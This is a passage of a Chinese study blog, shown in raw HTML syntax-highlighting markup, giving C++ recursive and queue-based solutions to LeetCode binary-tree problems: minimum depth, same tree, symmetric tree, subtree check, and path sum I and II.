class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left==<span class="literal">nullptr</span> || root-&gt;right==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">minDepth</span>(root-&gt;left)+<span class="built_in">minDepth</span>(root-&gt;right)+<span class="number">1</span>;<span class="comment">//必须进行该if判断</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span>(<span class="built_in">minDepth</span>(root-&gt;left),<span class="built_in">minDepth</span>(root-&gt;right))+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    注意【求最小深度】不能像求最大深度那杨，直接</span></span><br><span class="line"><span class="comment">    return min(minDepth(root-&gt;left),minDepth(root-&gt;right))+1;即可</span></span><br><span class="line"><span class="comment">    因为最小深度，在某结点左子树是空，右子树不为空时，若直接按照return求，结果是1；起始应该是3.如下例子。</span></span><br><span class="line"><span class="comment">    1 null 2 null null null</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//广度：层序遍历-队列</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) </span><br><span class="line">            que.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">int</span> minDepth = INT_MAX;</span><br><span class="line">        <span class="keyword">int</span> depth = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();<span class="comment">//该层个数</span></span><br><span class="line">            depth++;<span class="comment">//最小深度 重点！！！！</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode *node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">                <span class="keyword">if</span>(node-&gt;left==<span class="literal">nullptr</span> &amp;&amp; node-&gt;right==<span class="literal">nullptr</span>)</span><br><span class="line">                    <span class="keyword">return</span> depth;<span class="comment">//第一次遇到某节点的 左右孩子都是nullptr时，其就是最小深度</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//队列是空，证明没有根节点，即是 空树，返回 0</span></span><br><span class="line">        <span class="keyword">return</span> depth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>见下图：<br><img src="https://img-blog.csdnimg.cn/6afc1707bd1440f398b27cee7828cc7e.png"></p><h3 id="100-相同的树"><a href="#100-相同的树" class="headerlink" title="100 相同的树"></a>100 相同的树</h3><p><strong>对称二叉树</strong><br>给你两棵二叉树的根节点 p 和 q ，编写一个函数来检验这两棵树是否相同。<br>如果两个树在结构上相同，并且节点具有相同的值，则认为它们是相同的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(TreeNode *u, TreeNode *v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!u &amp;&amp; !v)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(!u || !v)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> u-&gt;val==v-&gt;val &amp;&amp; <span class="built_in">check</span>(u-&gt;left,v-&gt;left) &amp;&amp; <span class="built_in">check</span>(u-&gt;right,v-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSameTree</span><span class="params">(TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">check</span>(p,q);   </span><br><span class="line">    &#125; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    深度优先搜索</span></span><br><span class="line"><span class="comment">    O(min(m,n))</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSameTree</span><span class="params">(TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(p==<span class="literal">NULL</span> &amp;&amp; q==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(p==<span class="literal">NULL</span> || q==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(p-&gt;val != q-&gt;val)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">isSameTree</span>(p-&gt;left,q-&gt;left) &amp;&amp; <span class="built_in">isSameTree</span>(p-&gt;right,q-&gt;right);</span><br><span class="line">        &#125; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  同 对称二叉树-</span></span><br><span class="line"><span class="comment">    广度：队列</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(TreeNode *u, TreeNode *v)</span></span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; q;</span><br><span class="line">        q.<span class="built_in">push</span>(u);</span><br><span class="line">        q.<span class="built_in">push</span>(v);</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            u = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            v = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(!u &amp;&amp; !v)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>((!v || !u) || (u-&gt;val != v-&gt;val))<span class="comment">//注意 条件:两个、顺序不能改动</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            q.<span class="built_in">push</span>(u-&gt;left);</span><br><span class="line">            q.<span class="built_in">push</span>(v-&gt;left);</span><br><span class="line">            q.<span class="built_in">push</span>(u-&gt;right);</span><br><span class="line">            q.<span class="built_in">push</span>(v-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSameTree</span><span class="params">(TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">check</span>(p,q);   </span><br><span class="line">    &#125; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="101-对称二叉树"><a href="#101-对称二叉树" class="headerlink" title="101 对称二叉树"></a>101 对称二叉树</h3><p>给你一个二叉树的根节点 root ， 检查它是否轴对称。<br><strong>左右子树是否相等</strong>：相等了也不一定是 对称的！！！<br>【下面示例】：左右子树相等，但不是对称的！<br><img src="https://img-blog.csdnimg.cn/5e1999bf9d5643ad959e55005180f757.png"><br>如果一个树的左子树与右子树镜像对称，那么这个树是对称的。</p><p>两个树互为镜像：</p><ul><li>它们的两个根结点具有相同的值</li><li>每个树的右子树都与另一个树的左子树镜像对称</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归 O(n)</span></span><br><span class="line"><span class="comment">    「同步移动」两个指针的方法来遍历这棵树，p 指针和</span></span><br><span class="line"><span class="comment">     q 指针一开始都指向这棵树的根，随后 p 右移时，</span></span><br><span class="line"><span class="comment">     q 左移，p 左移时，q 右移。每次检查当前 p 和 q</span></span><br><span class="line"><span class="comment">      节点的值是否相等，如果相等再判断左右子树是否对</span></span><br><span class="line"><span class="comment">      称。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(TreeNode *p,TreeNode *q)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!p &amp;&amp; !q)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(!p || !q)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> p-&gt;val==q-&gt;val &amp;&amp; <span class="built_in">check</span>(p-&gt;left,q-&gt;right) &amp;&amp; <span class="built_in">check</span>(p-&gt;right,q-&gt;left);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSymmetric</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">check</span>(root,root);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>引入一个队列，这是把递归程序改写成迭代程序的常用方法</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代 O(n)</span></span><br><span class="line"><span class="comment">    首先引入一个队列。</span></span><br><span class="line"><span class="comment">    初始化时我们把根节点入队两次。每次提取两个结点并比</span></span><br><span class="line"><span class="comment">    较它们的值（【队列中每两个连续的结点应该是相等的】，</span></span><br><span class="line"><span class="comment">    【而且它们的子树互为镜像】），然后将两个结点的左右子结点</span></span><br><span class="line"><span class="comment">    按相反的顺序插入队列中。当队列为空时，或者我们检测</span></span><br><span class="line"><span class="comment">    到树不对称（即从队列中取出两个不相等的连续结点）</span></span><br><span class="line"><span class="comment">    时，该算法结束。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(TreeNode *u,TreeNode *v)</span></span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; q;</span><br><span class="line">        q.<span class="built_in">push</span>(u);</span><br><span class="line">        q.<span class="built_in">push</span>(v);</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            u = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            v = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(!u &amp;&amp; !v)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>((!u || !v) || (u-&gt;val!=v-&gt;val))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            q.<span class="built_in">push</span>(u-&gt;left);</span><br><span class="line">            q.<span class="built_in">push</span>(v-&gt;right);</span><br><span class="line"></span><br><span class="line">            q.<span class="built_in">push</span>(u-&gt;right);</span><br><span class="line">            q.<span class="built_in">push</span>(v-&gt;left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSymmetric</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">check</span>(root,root);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="572-另一棵树的子树"><a href="#572-另一棵树的子树" class="headerlink" title="572 另一棵树的子树"></a>572 另一棵树的子树</h3><p>给你两棵二叉树 root 和 subRoot 。检验 root 中是否包含和 subRoot 具有相同结构和节点值的子树。如果存在，返回 true ；否则，返回 false 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    改：写两个函数，分开</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//两个树 是否相同</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(TreeNode *root, TreeNode *subRoot)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!root &amp;&amp; !subRoot)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(!root || !subRoot)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val != subRoot-&gt;val)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">check</span>(root-&gt;left,subRoot-&gt;left)&amp;&amp;<span class="built_in">check</span>(root-&gt;right,subRoot-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//寻找</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">find</span><span class="params">(TreeNode *root, TreeNode *subRoot)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!root)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//遍历到最后都没找到 和 subRoot-&gt;val相同的root-&gt;val</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">check</span>(root,subRoot))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">find</span>(root-&gt;left,subRoot)||<span class="built_in">find</span>(root-&gt;right,subRoot);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSubtree</span><span class="params">(TreeNode* root, TreeNode* subRoot)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">find</span>(root,subRoot);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="112-路径总和——【判断】是否存在-满足条件的路径"><a href="#112-路径总和——【判断】是否存在-满足条件的路径" class="headerlink" title="112 路径总和——【判断】是否存在 满足条件的路径"></a>112 路径总和——【判断】是否存在 满足条件的路径</h2><p>给你二叉树的根节点 root 和一个表示目标和的整数 targetSum 。判断该树中是否存在【根节点到叶子节点】的路径，这条路径上所有节点值相加等于目标和 targetSum 。如果存在，返回 true ；否则，返回 false 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment">    时间：O(N) 遍历一次</span></span><br><span class="line"><span class="comment">    空间：O(H)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">hasPathSum</span><span class="params">(TreeNode* root, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">//从根节点到当前节点的值之和为 val</span></span><br><span class="line">        <span class="comment">//将这个大问题转化为一个小问题：是否存在从当前节点的子节点到叶子的路径，满足其路径和为 sum-val</span></span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left==<span class="literal">nullptr</span> &amp;&amp; root-&gt;right==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> sum==root-&gt;val;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hasPathSum</span>(root-&gt;left,sum-root-&gt;val) || <span class="built_in">hasPathSum</span>(root-&gt;right,sum-root-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    广度优先遍历</span></span><br><span class="line"><span class="comment">    时间：O(N) 遍历一次</span></span><br><span class="line"><span class="comment">    空间：O(N) 队列开销</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">hasPathSum</span><span class="params">(TreeNode* root, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        queue&lt;TreeNode*&gt; que_node;</span><br><span class="line">        queue&lt;<span class="keyword">int</span>&gt; que_val;</span><br><span class="line">        que_node.<span class="built_in">push</span>(root);</span><br><span class="line">        que_val.<span class="built_in">push</span>(root-&gt;val);</span><br><span class="line">        <span class="keyword">while</span>(!que_node.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            TreeNode *now = que_node.<span class="built_in">front</span>();</span><br><span class="line">            <span class="keyword">int</span> tmp = que_val.<span class="built_in">front</span>();<span class="comment">//当前结点 值</span></span><br><span class="line">            que_node.<span class="built_in">pop</span>();</span><br><span class="line">            que_val.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(now-&gt;left==<span class="literal">nullptr</span> &amp;&amp; now-&gt;right==<span class="literal">nullptr</span>)&#123;<span class="comment">//到叶结点时 进行判断</span></span><br><span class="line">                <span class="keyword">if</span>(tmp==sum)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(now-&gt;left != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">                que_node.<span class="built_in">push</span>(now-&gt;left);</span><br><span class="line">                que_val.<span class="built_in">push</span>(now-&gt;left-&gt;val+tmp);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(now-&gt;right != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">                que_node.<span class="built_in">push</span>(now-&gt;right);</span><br><span class="line">                que_val.<span class="built_in">push</span>(now-&gt;right-&gt;val+tmp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="113-路径总和-II——【返回】-满足条件的路径"><a href="#113-路径总和-II——【返回】-满足条件的路径" class="headerlink" title="113 路径总和 II——【返回】 满足条件的路径"></a>113 路径总和 II——【返回】 满足条件的路径</h2><p>给你二叉树的根节点 root 和一个整数目标和 targetSum ，找出 <strong>所有</strong> 从根节点到叶子节点 路径总和等于给定目标和的路径。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    注意回溯！！</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(TreeNode *root, <span class="keyword">int</span> targetSum)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        path.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        targetSum -= root-&gt;val;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left==<span class="literal">nullptr</span> &amp;&amp; root-&gt;right==<span class="literal">nullptr</span> &amp;&amp; targetSum==<span class="number">0</span>)</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">        <span class="comment">//注意！！！！！！！正确</span></span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left)&#123;</span><br><span class="line">            <span class="built_in">dfs</span>(root-&gt;left,targetSum);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();<span class="comment">//回溯</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;right)&#123;</span><br><span class="line">            <span class="built_in">dfs</span>(root-&gt;right,targetSum);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();<span class="comment">//回溯</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">pathSum</span>(TreeNode* root, <span class="keyword">int</span> targetSum) &#123;</span><br><span class="line">        <span class="built_in">dfs</span>(root,targetSum);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//看看！！！！！！！！！！</span></span><br><span class="line"><span class="comment">//正确</span></span><br><span class="line"><span class="keyword">if</span>(root-&gt;left==<span class="literal">nullptr</span> &amp;&amp; root-&gt;right==<span class="literal">nullptr</span> &amp;&amp; targetSum==<span 